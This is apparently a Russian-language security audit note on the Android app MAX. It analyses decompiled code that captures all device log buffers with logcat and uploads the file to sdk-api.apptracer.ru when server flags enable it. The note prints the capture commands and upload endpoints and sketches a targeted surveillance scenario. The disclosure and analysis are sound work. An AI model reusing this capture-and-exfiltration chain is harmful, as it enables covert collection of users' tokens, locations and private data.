---
tags: [critical, logcat, surveillance, exfiltration, production, server-control, logs]
status: verified
severity: critical
sources:
  - work/jadx_base/sources/defpackage/g85.java
  - work/jadx_base/sources/ru/ok/tracer/upload/SampleUploadWorker.java
related:
  - "[[46-server-controlled-logging-flags]]"
  - "[[244-log-sensitive-server-flag]]"
  - "[[322-apptracer-sample-upload]]"
  - "[[112-user-debug-report-chat]]"
  - "[[531-wiretap-chain-collect-debug-dump]]"
---

# 535. Logcat capture → файл → SampleUploadWorker → apptracer.ru

## Суть

В production-сборке MAX есть код (`g85.java`), который запускает `logcat -b all -v long -f <path>` через `ProcessBuilder`, захватывая **ВСЕ лог-буферы устройства** в файл. Файл затем может быть загружен на `sdk-api.apptracer.ru` через `SampleUploadWorker`. Активация — серверными PmsKey `log-full`, `log-sensitive`, `user-debug-report`.

## Механизм

### Шаг 1: Захват логов (g85.java)

```java
ProcessBuilder pb = new ProcessBuilder("logcat", "-f", filePath, "-b", "all", "-v", "long");
pb.start();

// Второй вариант — с ротацией:
ProcessBuilder pb2 = new ProcessBuilder("logcat", "-f", filePath, "-b", "all", "-v", "long", "-r", "8196", "-n", "4");
pb2.start();
```

Параметры:
- `-b all` — **все** лог-буферы (main, system, radio, events, crash)
- `-v long` — полный формат с timestamp и PID
- `-f <path>` — запись в файл
- `-r 8196 -n 4` — ротация: 4 файла по 8 МБ = до **32 МБ логов**

### Шаг 2: Загрузка (SampleUploadWorker)

Файл логов передаётся в `SampleUploadWorker` через WorkManager:
```
tracer_sample_file_path = <путь к logcat-файлу>
tracer_feature_name = "logs" (или аналогичное)
```

Upload:
```
POST https://sdk-api.apptracer.ru/api/sample/initUpload?sampleToken=...
POST https://sdk-api.apptracer.ru/api/sample/upload?uploadToken=...
```

### Шаг 3: Серверная активация

PmsKey-флаги:
- `log-full` — включить полное логирование
- `log-sensitive` — включить логирование чувствительных данных
- `user-debug-report` — включить debug-отчёт для конкретного пользователя
- `userLogReportChatId` — ID чата, куда отправить лог-отчёт

## Что содержат логи Android

Буфер `all` включает:
- **main** — логи приложений (URL, токены, имена контактов, тексты уведомлений)
- **system** — системные события (WiFi SSID, GPS координаты, Bluetooth устройства)
- **radio** — телефония (номера, SMS-фрагменты на некоторых устройствах)
- **events** — системные метрики
- **crash** — стектрейсы с путями файлов и переменными

## Что делает это критическим

1. **Логи содержат данные ДРУГИХ приложений** — не только MAX
2. **32 МБ** ротируемых логов — это часы/дни активности устройства
3. **Серверная активация** — пользователь не знает, что логи собираются
4. **Автоматическая выгрузка** через WorkManager — переживает перезапуск
5. **В production** — не debug-сборка
6. **Таргетированная** — `user-debug-report` позволяет включить для конкретного userId

## Сценарий атаки

```
Сервер MAX:
  1. Устанавливает PmsKey log-full=true для userId=12345
  2. g85.java запускает logcat -b all -f /cache/tracer/logs.txt
  3. Через N минут — SampleUploadWorker загружает файл на apptracer.ru
  4. На сервере — полный лог устройства жертвы, включая:
     - URL из браузера
     - Токены авторизации других приложений
     - GPS-координаты из системных логов
     - WiFi SSID/BSSID
     - Имена Bluetooth-устройств рядом
     - Тексты уведомлений от банковских приложений
```

## Отличие от wiretap chain (topic 531)

- Topic 531 записывает **аудио звонков** — работает только во время звонка
- Topic 535 записывает **все логи устройства** — работает в любое время, захватывает данные всех приложений

## Статус в 26.16.0

Без изменений. `g85.java`, `SampleUploadWorker`, PmsKey `log-full`/`log-sensitive` — всё на месте.
